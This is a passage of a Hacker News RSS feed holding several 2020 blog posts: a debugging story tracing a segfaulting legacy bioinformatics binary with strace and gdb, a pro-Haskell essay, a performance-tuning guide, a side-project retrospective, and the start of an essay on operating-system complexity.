            <guid isPermaLink="false">hacker-news-small-sites-24950132</guid>
            <pubDate>Sat, 31 Oct 2020 09:52:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Extreme Debugging]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950120">thread link</a>) | @merlinscholz
<br/>
October 31, 2020 | https://squanderingti.me/blog/2020/10/28/extreme-debugging.html | <a href="https://web.archive.org/web/*/https://squanderingti.me/blog/2020/10/28/extreme-debugging.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    



    <div role="main">
      <div>
        




<article>
  <p>There’s debugging and there’s <em>debugging</em>.
This is a story of the latter.
Before we get into this jaunt I’d like to add that I’ve written this piece to mimic how we actually got to the conclusion.
If you’re experienced in strange stuff you might see a faster route or use a different tool.
There’s more than one way to do most of this and this was what I had at hand when I needed it.</p>

<h2 id="all-stories-start-somewhere">All stories start somewhere</h2>

<p>Some background first.
I’m currently working in a bioinformatics lab that works on the functional identification of proteins.
One of our projects requires that we benchmark against an older tool that performs a similar function.
I’m not going to throw the particular tool under the bus, but needless to say, it’s charming in a way that only academic software can be.</p>

<ul>
  <li>Documentation ranges from “poor” to “nonexistent.”</li>
  <li>It’s held together with an unholy amalgamation of Perl, awk, tsch, and yes, <strong>Fortran</strong>.</li>
  <li>It includes/distributes binaries to other programs that the internet has <em>forgotten</em>.</li>
  <li>Some of the copyright headers are from when I was in elementary school- others before even that.</li>
</ul>

<p>So… “charming.”
A web-based version is available but is limited to how many proteins you can submit (via cgi-bin!) within a 24 hour window (it’s a low number- say ~100) and we need to process well over 100k.
So the naive, innocent question that started this was:</p>

<blockquote>
  <p>“Well, can we run it locally?”</p>
</blockquote>

<p>After all, all the pieces are available for download so it would seem simple enough, right?
You can probably already surmise the answer since you’re reading an article called “extreme debugging.”</p>

<p>I’m going to focus on a small pieces of a much larger puzzle called <code>netNGlyc</code>.
This handy, dandy little program is used to predict <a href="https://en.wikipedia.org/wiki/N-linked_glycosylation">N-glycosylation</a> sites in proteins.
It’s distributed as a tarball.
Easy enough!</p>

<p>We can unpack it, and then perform setup by editing its main file <code>netNglyc</code> (written in <code>tsch</code>) by specifying the path to the unpacked dir.
Easy peazy.
And then we run the quick test and…</p>

<p><img src="https://squanderingti.me/img/nGlyc/seg_faults.gif" alt="">
<em>All the segfaults</em></p>

<h2 id="what-process-is-actually-segfaulting">What process is actually segfaulting?</h2>
<p>The entry point into this program is a <code>tsch</code> script that calls numerous additional <code>awk</code> and <code>tsch</code> files.
We have a few options we can try.</p>

<p>If kernel logging is enabled, then <code>dmesg</code> logs might include the offender like the following.</p>

<div><div><pre><code>[30590535.213144] how98_Linux[1560171]: segfault at 8000000 ip 00000000080744f7 sp 00000000ffb8a114 error 4 in how98_Linux[8048000+5a000]
</code></pre></div></div>

<p>A second option, assuming <code>dmesg</code> doesn’t include this or doesn’t help, is to use <code>strace</code>.
If you don’t have much experience with <code>strace</code> and you work on Linux frequently, it’s very much worth your while to learn this tool.
We’re going to use it with <code>-f</code> for “follow process forking” so we can see everything that ends up being called.
We’re also invoking it with <code>-o</code> so we can write the output to a file and go through it.</p>

<div><div><pre><code>strace -f -o /tmp/debugging ./netNglyc test/LEUK_RAT.fsa
</code></pre></div></div>

<p>And then look through the output:</p>

<div><div><pre><code>grep SIGSEGV /tmp/debugging
</code></pre></div></div>

<p>Looking for <code>SIGSEGV</code> will show us everywhere a segfault signal was handled.
We’ll hopefully see lines like the following, where the left-most integer is the PID of the process.</p>

<div><div><pre><code>1560785 +++ killed by SIGSEGV (core dumped) +++
</code></pre></div></div>

<p>Now we can grep for both the PID and the <code>execve</code> syscall<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> to see what program was launched.</p>

<div><div><pre><code>grep 1560785 /tmp/debugging | grep exec
</code></pre></div></div>

<p>Lo and behold:</p>

<div><div><pre><code>1560785 execve("/mnt/home/cchandler/ceph/Programs/netNglyc-1.0-broken/how/how98_Linux", ["/mnt/home/cchandler/ceph/Program"...], [/* 89 vars */]) = 0
</code></pre></div></div>

<h2 id="exploring-the-target">Exploring the target</h2>

<p>We have our culprit.
It’s whatever <code>how98_Linux</code> is.
First question: what exactly is it?</p>

<div><div><pre><code>$ file how98_Linux
how98_Linux: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.0.0, stripped
</code></pre></div></div>

<p>Oh.
So the thing crashing is an <em>old</em> statically linked binary that’s been fully stripped<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</p>

<p>A quick run of <code>nm</code> will confirm the awful truth and yield the same result.</p>

<div><div><pre><code>$nm how98_Linux
nm: how98_Linux: no symbols
</code></pre></div></div>

<p>So let’s quickly recap what we learned:</p>

<ol>
  <li>We have a 32-bit ELF binary</li>
  <li>Statically linked with glibc</li>
  <li>Against Linux ABI 2.0.0 (for the record: that’s from 1996)</li>
  <li>And it has no symbol table</li>
</ol>

<h2 id="maybe-recreate-its-input">Maybe recreate its input?</h2>

<p>The question at hand is now: is there something wrong with this ancient program, or is there something wrong with our environment?
After all, it’s been in use for years and years (right??).
Inspecting the binary is going to take some effort, so maybe the best approach is to make sure that the input files are correct.
Previously, we’ve run into problems with other programs like this thanks to subtle differences between shells or between <code>gawk</code> vs <code>awk</code> etc.</p>

<p>From the <code>strace</code> output for <code>exec</code> we can see the program didn’t actually take any arguments.
Right after the name of the program there’re square brackets indicating the arguments.
If I make up an argument like “asdf” and pass it to the program you can see it.</p>

<div><div><pre><code>$strace -f -eexecve ~/ceph/Programs/netNglyc-1.0-broken/how/how98_Linux asdf

execve("/mnt/home/cchandler/ceph/Programs/netNglyc-1.0-broken/how/how98_Linux", ["/mnt/home/cchandler/ceph/Program"..., "asdf"], [/* 65 vars */]) = 0
</code></pre></div></div>

<p>It would be a fairly logical deduction to say that it must be reading from <code>stdin</code>.
Indeed, the <code>strace</code> output contains a <code>read(0)</code>.</p>

<div><div><pre><code>1560785 read(0,  &lt;unfinished ...&gt;
1560785 &lt;... read resumed&gt; "********************************"..., 4096) = 4096
</code></pre></div></div>

<p>On Linux, file descriptor 0 is always <code>stdin</code><sup id="fnref:5" role="doc-noteref"><a href="#fn:5">3</a></sup>.
It’s starting to look like we’re not going to get out of digging through all the <code>tsch</code> and <code>awk</code>.
Secondly, that line of stars “*****” is actually a preview of the what the process read, and we can find a matching call above to <code>write</code>.</p>

<div><div><pre><code>1560675 write(1, "********************************"..., 4096 &lt;unfinished ...&gt;
</code></pre></div></div>

<p>Yup. Here we have the file descriptor 1 which is always <code>stdout</code>.</p>

<p>Everything is being redirected via pipes.
Unfortunately, reconstructing the movement of data through pipes is extremely non-trivial.
<em>Somewhere</em> in the <code>strace</code> output we’re going to find some calls to <code>open()</code> which will reveal the paths to the specific files we’re looking for.
Double unfortunately, if they’re interleaved with <code>chdir</code> calls we might only have relative paths.
There’s also the problem of just a <strong>ton</strong> of data.
A quick run of <code>strace</code> tracking only <code>open()</code> calls yields thousands of results.</p>

<div><div><pre><code>strace -f -eopen -o /tmp/opens ./netNglyc test/LEUK_RAT.fsa
*output omitted*

wc -l /tmp/opens
5489 /tmp/opens
</code></pre></div></div>

<p>Ugh.
Even if we filter out all the <code>open</code> calls to library files we’re still left with north of 2k results.
An alternate approach might be needed.</p>

<h2 id="a-break--a-very-surprising-twist">A break &amp; a very surprising twist</h2>

<p>Break time.</p>

<p>Time to switch gears and deal with a few other things.
How about making a copy of <code>netNGlyc</code> in my home directory so I can do some more analysis later.
Let’s give it a run to make sure the error is reproducible.</p>

<p><img src="https://squanderingti.me/img/nGlyc/working.gif" alt="">
<em>Excuse me?</em></p>

<p><em>Of course</em> it ran correctly.
No segfaults. No goofy messages.</p>

<p>Somehow, copying the files to my home directory fixes everything.
No permissions were modified in the process.
The only difference between the working copy and broken copy are which filesystem they’re running on<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">4</a></sup>.
It’s suddenly starting to appear that this segfault is somehow filesystem related.</p>

<p>But that’s nonsense.
What could it possibly be doing that would interfere with the underlying filesystem?</p>

<h2 id="sleep--the-inputs-at-last">Sleep &amp; the inputs at last</h2>

<p>The next morning.</p>

<p>Part of the problem with locating the errant inputs is that the <code>netNGlyc</code> script cleans up after itself.
It’s doing this via <code>rm -rf</code> on its temp directory.
Commenting that out we now have a <code>tmp</code> directory full of subdirectories.
We can combine our sequence of asterisks from the <code>strace</code> output with <code>grep</code> to finally locate the files in question.</p>

<div><div><pre><code>$ grep -H '^\*\*\*\*' * | sort | uniq
how.test.dat:**************************************************************************
tmp.dat.1576058:**************************************************************************
tmp.dat.1576071:**************************************************************************
tmp.dat.1576086:**************************************************************************
tmp.dat.1576098:**************************************************************************
tmp.dat.1576110:**************************************************************************
tmp.dat.1576153:**************************************************************************
tmp.dat.1576192:**************************************************************************
tmp.dat.1576235:**************************************************************************
tmp.dat.1576258:**************************************************************************
</code></pre></div></div>

<p>The input files are all named something like <code>tmp.dat.123456</code>.
The trailing number in the filename (<code>-H</code> to <code>grep</code>) is likely the PID of the process that originally created it.</p>

<p>Let’s pipe one of these files to our friend <code>how98_Linux</code>.</p>
<div><div><pre><code>$ ../../how/how98_Linux &lt; tmp.dat.1576192
open: can't stat file
apparent state: unit 3 named test.how
lately reading sequential formatted external IO
Segmentation fault (core dumped)
</code></pre></div></div>

<p>Fantastic! We finally have a small chunk of iterable work that we can play with.
The copy in my home directory works the same way, except of course that it outputs the correct result.</p>

<h2 id="a-hammer-named-gdb">A hammer named GDB</h2>

<p>Maybe there’s <em>something</em> we can learn from this binary.
Every time in my career that I’ve had to reach for <code>strace</code> and <code>gdb</code> to fix third-party code it has been a tale of woe.</p>

<p>This case is probably no different.</p>

<p>Remember that stripped symbol table?
Normally we could run <code>where</code> inside <code>gdb</code> and it would return all the frames on the stack.</p>

<div><div><pre><code>(gdb) run &lt; tmp.dat.1576058
Starting program: /mnt/ceph/users/cchandler/Programs/netNglyc-1.0-broken/tmp/netNglyc-1576032/../../how/how98_Linux &lt; tmp.dat.1576058
open: can't stat file
apparent state: unit 3 named test.how
lately reading sequential formatted external IO

Program received signal SIGSEGV, Segmentation fault.
0x080744f7 in ?? ()
(gdb) where
#0  0x080744f7 in ?? ()
#1  …</code></pre></div></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://squanderingti.me/blog/2020/10/28/extreme-debugging.html">https://squanderingti.me/blog/2020/10/28/extreme-debugging.html</a></em></p>]]>
            </description>
            <link>https://squanderingti.me/blog/2020/10/28/extreme-debugging.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950120</guid>
            <pubDate>Sat, 31 Oct 2020 09:49:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950102">thread link</a>) | @_query
<br/>
October 31, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950102</guid>
            <pubDate>Sat, 31 Oct 2020 09:46:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Improvements]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950014">thread link</a>) | @scary-size
<br/>
October 31, 2020 | https://franz.hamburg/writing/performance-improvements.html | <a href="https://web.archive.org/web/*/https://franz.hamburg/writing/performance-improvements.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>2020-10-31</p>
      <p>
        This post will describe a performance guide I presented to my team
        last week. We encountered some issues with one of our services due to
        configuration change. The change quadrupled the average processing
        time for a single message. To be more precise, the change happened in
        the data mapping DSL, which helps analysts describe how input data is
        mapped to output data. Read more about it
        <a href="https://www.otto.de/jobs/technology/techblog/artikel/adatamappingdsl.php">here</a>
        here. I took this week to make the service run at a reasonable speed
        again. Below you’ll find the approach I take, when trying to improve
        application performance.
      </p>
      <p>
        <em>Disclaimer: There will be a lot of assumptions and the guide
          often talks about message processing. I understand that this doesn’t
          represent every application, but the core principles mentioned in the
          “Prerequisites” section still stand. I’m mostly using the term
          „application“ here, but I really mean any type of software, be it a
          backend service, frontend app or simple script.
        </em>
      </p>
      <h3>Motivation</h3>
      <img src="https://franz.hamburg/assets/images/performance-improvements-1.jpg" alt="graph showing average provessing time per message">
      <p>
        There is a wide range of reasons, why the performance of an application needs to be improved:
      </p><ol>
        <li>The application would be able to run more efficiently <a href="#footnote-1">[1]</a>.</li>
        <li>The application needs to run faster to be worth running at all, for it to be economical.</li>
        <li>Performance is a competitive advantage <a href="#footnote-2">[2]</a>.</li>
        <li>The high standards of the developer aren’t met.</li>
        <li>And many others: More stable, predictable runtime behaviour, increased future load, building a strong basis
          for future features.</li>
      </ol>
      

      <h3>Prerequisites</h3>
      <p>
        To actually make an impact on application performance, you’ll need to fulfil some requirements. There needs to
        be <strong>measurability</strong>. You need to be able to measure the metric you want to go down/up. You can
        record those by
        doing local benchmarks or by actually reporting metrics to a metric backend (Prometheus, CloudWatch or similar).
        Though the latter one might be to coarse.
      </p>
      <p>
        The next thing you want is <strong>reproducibility</strong>, you’ll need to be able to reproduce your measured
        results. Your
        application should be able to process the same n messages in the same amount of time. Also replaying the same
        input data should work effortless. This can actually be pretty tough, if your application depends on an external
        system like a database, a message broker or another cloud-thingy; I’ll get to that down the line.
      </p>
      <p>
        The final piece is <strong>profiling</strong>, which enables you to drill down on what your application spends
        its time on. It’s
        mandatory that you can investigate which components of your application you should improve: If your app is
        spending 80% of its CPU time on JSON parsing, you should probably focus on that area. Maybe switch to a faster
        parser or a different serialisation format like protobuf. Don’t go to work on those other 20%, your improvements
        won’t be very impactful. For profiling flame graphs are a good choice, for smaller scripts you might be able to
        instrument the code yourself.
      </p>
      <p>
        To summarise: you want to measure, reproduce and profile your application’s runtime behaviour.
      </p>

      <h3>Approach</h3>
      <p>
        Set yourself a goal and a time frame. Both can be rough estimates, but you should stick to them nevertheless.
        Working on performance can be a tricky rabbit hole filled with micro optimisations and intensive swearing.
        Having a plan to stick to keeps you focused on the big wins. This can be as straightforward as: „This week I’m
        going to improve message throughput (a measurable metric!) by at least 10 percent points“. On the other hand you
        shouldn’t create unnecessary pressure for yourself, if the performance issue can be mitigated by a reasonable
        amount of additional hardware, go for it! The amount of hardware you get compared to a few hours of work is
        substantial. This just shouldn’t become your default solution.
      </p>
      <p>
        It’s time to get your hands dirty, you should be able to start your application locally and put data into it.
        Preferably you want to cut out external system like remote databases. Can you extract your core business logic
        from the dirty gripes of remote data fetching? Great, setup up a standalone version of your app, which can read
        input from file or a local database. Otherwise do your best to at least make your input data deterministic. Work
        with a frozen database table or re-read that Kafka topic from a known point. If you are having a hard time with
        that, it might be wise to spend some time upfront and work on better a separation of concerns within your
        application. Knowledge about where your data lives and gets send off to shouldn’t leak into the business side of
        things, push those concerns onto the edges of your application. The next item on the list is to establish a
        baseline measurement, something you can later use to make a comparison. I’m a fan of documenting those
        measurements in a spreadsheet. It helps with calculating differences and allows you to document future changes.
      </p>
      <p>
        Now you can finally get into things, run the benchmark/standalone version and attach the profiler. You probably
        already have some suspicions about what might slow the application down, confirm those with actual numbers.
        There might also be a lot of low-hanging fruits, which will only take a few minutes to fix, but in total will
        already make a noticeable impact. If you find other performance sins, document them and prioritise them
        according to their predicted impact and effort of the fix. Now just rinse and repeat: Fix an issue, validate the
        improvement, profile and start over.
      </p>

      <h3>Typical Pitfalls</h3>
      <p>
        Some common things you might encounter when trying to improve application performance:
      </p><ul>
        <li>Actually static values which will be recalculated very very often and are surprisingly expensive to do so.
          I found a regular expression which was recompiled from a string over 500 times per input messages. The source
          string was known on application start-up.</li>
        <li>A collection of things is calculated, but most of the results are discarded later on. If your iterate over
          a collection to calculate something for each item and later on do a <code>collection.find(...)</code> call,
          you might
          want to use a lazy collection.</li>
        <li>If a single item in a collection is always searched for by a given key: Use a data structure with O(1)
          access like a hash map instead of a sequence. Generally speaking: use the correct data structure for the job
          at hand. It might cost you to convert a JSON array into a map, but that cost will amortize itself surprisingly
          fast.
        </li>
        <li>The Complete Rewrite™ is probably not the solution to your performance issues.</li>
      </ul>
      

      <h3>Conclusion</h3>
      <p>
        Performance work is fun and rewarding. Though there is a hurdle to establish a reproducible benchmark you can
        run locally, this benchmark will pay off. It is also a useful thing to have for reproducing some of those
        nastier bugs. Improving the core performance of your application will offer you deep insights into your
        programming language of choice and make you more proficient with it. Performance work isn’t a one-off task you
        do once, you’ll need to continually monitor and measure your application as it will change over time.
      </p>

      <h4>Notes</h4>
      <p id="footnote-1">
        [1] <strong>efficient</strong> meaning less resource consumption (CPU, Memory, Network etc.) for the same
        result.
        Also: Same resource consumption for a better result, for example more frames per second on an UI app.
      </p>
      <p id="footnote-2">
        [2]
        <a href="https://blog.codinghorror.com/speed-still-matters/">Speed still matters</a>,
        <a href="https://www.fastcompany.com/1825005/how-one-second-could-cost-amazon-16-billion-sales">How One Second
          Could Cost Amazon $1.6 Billion In Sales</a>,
        <a href="https://www.gigaspaces.com/blog/amazon-found-every-100ms-of-latency-cost-them-1-in-sales">Amazon Found
          Every 100ms of Latency Cost them 1% in Sales</a>
      </p>

      <p>← <a href="https://franz.hamburg/writing.html">Other posts</a></p>
    </div></div>]]>
            </description>
            <link>https://franz.hamburg/writing/performance-improvements.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950014</guid>
            <pubDate>Sat, 31 Oct 2020 09:16:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Failed 2 Side Projects in Under a Year and Lessons Learned]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950005">thread link</a>) | @moeminm
<br/>
October 31, 2020 | https://blog.moeminmamdouh.com/how-i-failed-2-side-projects-in-under-a-year-and-lessons-learned | <a href="https://web.archive.org/web/*/https://blog.moeminmamdouh.com/how-i-failed-2-side-projects-in-under-a-year-and-lessons-learned">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><code>I feel like I should start off this blog post by mentioning that I am a Product Designer with little to no development skills, so I heavily rely on no-code tools to get my side projects up and running.</code></p>
<p>The idea of creating something that thousands of users could potentially use was just so exciting to me. Over the course of just shy of a year, I worked on 2 projects that made me less than $20, <strong>combined</strong>, so I feel like it's safe to say I can share my experience with you guys and hopefully you'll learn from my mistakes.</p>

<p> <img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604131920818/D9DxXPfJk.png?auto=format&amp;q=60" alt="Custom Size – 3.png"></p>
<p>Oof, designtarget was a wild ride. On 18-8-2019, god knows what happened but I just hopped on Namecheap and purchased the domain <a href="http://designtarget.org/" target="_blank">designtarget.org</a> with no prior experience in web development. I was just so into the idea of creating the 'ultimate design directory' that I really didn't think anything through. How would I monetize the platform? Do I even have a list of resources that I can work with? Where will I market the website? So many questions, and little to no answers.</p>
<p>I remembered seeing an ad for a visual editor plugin on Wordpress called Elementor, it seemed intuitive so I go to Namecheap's cPanel and install Wordpress, purchase a year's subscription to Elementor and I get building. Literally next day I was done, I didn't think the design through, I just wanted to get an MVP out right away, and this atrociousness was born, but I was proud of it. I had no web development knowledge and I made a website, and it felt great.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604132243316/TKr68CyWaA.png?auto=format&amp;q=60" alt="Web 1920 – 1.png"></p>
<p>Naturally, I wanted people to see what I had built, so I go on Reddit and post the website on /r/webdev - no it wasn't a Saturday(you can only post your work on Feedback Saturday on /r/webdev), yes the post was locked. But that doesn't matter, why you ask?</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604132936013/UONs_j1_Z.png?auto=format&amp;q=60" alt="Mask Group 1.png"></p>
<p>8.5k visitors in less than 2 hours of being on reddit when I wasn't supposed to. I knew I was onto something, but a little after the hype died down, it dawned on me, I just missed a huge chance to build an audience. I rushed creating the website that I missed some essentials such as <strong>creating a newsletter sign up</strong> or even just a <strong>blog</strong>.</p>
<p>Fast-forward a few months, I eventually create a newsletter, Instagram page, and even a blog. </p>
<p>📧 ~300 newsletter subscribers.</p>
<p>📸 ~400 Instagram followers.</p>
<p>and most importantly, my blogs were ranking on Google. I don't have Search Console screenshots but I had ranked around ~11th or so for a few articles. </p>
<p>I had solved the traffic problem of any side project, but monetization was where this project went downhill. I simply had no monetization plan whatsoever. And this is where the story of designtarget, ends, well, I sold off the project for a measly amount but that was it.</p>
<h3 id="lessons-learned">Lessons learned:</h3>
<p>👉 No matter how excited you are, keep cool and think things through.</p>
<p>👉 Traffic is easy, business is hard. </p>
<p>👉 Think things through, but also do not spend much time working on an MVP.</p>
<p>👉 It is fine to not know what you're doing.</p>

<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604133785236/39YjxeLlg.png?auto=format&amp;q=60" alt="screencapture-moeminm-github-io-goodcode-2020-10-31-10_42_27.png"></p>
<p>This one is close to my heart, it really is. You can read my <a target="_blank" href="https://www.indiehackers.com/product/good-code/temporarily-pausing-work-on-good-code--MKnKtlnidKMGLMQAuyr">post on IndieHackers</a> to know why I stopped working on Good Code.</p>
<p>The idea originally came to me when I discovered  <a target="_blank" href="http://frontendmentor.io/">Frontend Mentor</a>, by then I had learned HTML, CSS, and a little bit of JavaScript and wanted to improve my skills. I liked FEM, but the free templates were just not the level of design I wanted to work on, queue Good Code.</p>
<p>This time, I was ready, monetization plan was straight-forward, content was ready, community building was in place, newsletter was in place. I cook up a static version of the website using HTML and CSS and release it on Github Pages, you can view Good Code  <a target="_blank" href="https://moeminm.github.io/goodcode">here</a> and straight to reddit I go (and IndieHackers this time as well). </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604134249747/BPvkUcJ5j.png?auto=format&amp;q=60" alt="Mask Group 2.png"></p>
<p>September 3rd, to September 15th. I was onto something, again. Shortly after launching, I view my Gumroad page only to find 2 customers have purchased templates for a total of $10. My first internet money! </p>
<p>I also had people posting their solutions on the <a target="_blank" href="https://www.reddit.com/r/GoodCodeChallenge/">subreddit</a>  I created just for this website, it felt great.</p>
<p>I really wanted to continue working on Good Code, as it stands, it's only hosted on GH Pages, so there's a good chance there <em>could</em> have been more sales had it been on an actual domain. I might resume working on Good Code in a future date, but for now, I'm pausing for reasons listed in the  <a target="_blank" href="https://www.indiehackers.com/product/good-code/temporarily-pausing-work-on-good-code--MKnKtlnidKMGLMQAuyr">IndieHackers post</a>. </p>
<h3 id="lessons-learned">Lessons learned:</h3>
<p>👉 Spin ideas. I could have just released this as just another website selling Adobe XD templates, but I feel like the 'improve your HTML and CSS skills' twist was what brought this to life.</p>
<p>👉 Create a community for your side-project.</p>
<p> 👉 Don't be afraid to shut down.</p>
<p>To wrap things up, had I not started designtarget, I wouldn't have learned how to code (albeit being bad at it), had I not learned how to code, I wouldn't have started Good Code and made my first $ from a side-project, who knows what my next had I not started is going to be, but I feel like it might be success.</p>
</div></div>]]>
            </description>
            <link>https://blog.moeminmamdouh.com/how-i-failed-2-side-projects-in-under-a-year-and-lessons-learned</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950005</guid>
            <pubDate>Sat, 31 Oct 2020 09:12:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Complexity in Operating Systems]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949983">thread link</a>) | @quyleanh
<br/>
October 31, 2020 | https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html | <a href="https://web.archive.org/web/*/https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Over the last years I’ve been working on very different operating
systems. Operating systems are usually incredibly complex beasts. I
think there are mainly three drivers of this complexity. Surprisingly
enough, neither of these is having to deal with hardware.</p>

<p>The first one is resource <strong>discovery</strong>, i.e. figuring out how the
computer the OS is running on actually looks like. On x86, this
involves parsing countless bitfields, tables, executing byte code
provided by the firmware, probing individual features, etc. The most
painful example of this I’ve seen so far is figuring out which
interrupt a particular PCI interrupt line is routed to. It’s worth a
set of posts, but until then, feel free to checkout <a href="https://habr.com/en/post/501912/">this
description</a>. (If it’s down, it’s
also cached by
<a href="https://webcache.googleusercontent.com/search?q=cache:CXZUV61m7hwJ:https://habr.com/en/post/501912/+&amp;cd=1&amp;hl=en&amp;ct=clnk">Google</a>.)</p>

<p>The second issue is <strong>resource management</strong>. Essentially, how do you
hand out and eventually reclaim all the resources you discovered. For
some workloads performance matters here, so this code is usually
written with speed in mind.</p>

<p>The third reason is that at compile time the <strong>workload</strong> is
unclear. So the kernel has to assume the worst. It must be ready to
start a couple of hundred VMs or create a thousand TCP sockets in a
blink of an eye, because there is no way to know what’s going to
happen or what the actual requirements are.</p>

<p>A fun exercise is to checkout the <a href="https://elixir.bootlin.com/linux/v5.9.1/source/virt/kvm/kvm_main.c#L739">KVM code for creating
VMs</a>. Try
to follow
<a href="https://elixir.bootlin.com/linux/v5.9.1/source/arch/x86/kvm/x86.c#L9904">the</a>
<a href="https://elixir.bootlin.com/linux/v5.9.1/source/arch/x86/kvm/vmx/vmx.c#L7059">code</a>
to where the actual VM is created in hardware. <em>Spoiler:</em> There is
none. It’s all figuring out what the platform can do and then setting
up a bunch of spinlock, mutexes, lists, arrays, structs, …</p>

<p>I don’t want to pick on KVM in particular. I think it’s pretty ok as
far as Linux kernel code goes. Operating System kernel code is mostly
like this: A lot of really mind numbing platform discovery and
resource management code written for speed assuming the worst case
requirements in a language that doesn’t do parsing, resource
management or concurrency well (among other things).</p>

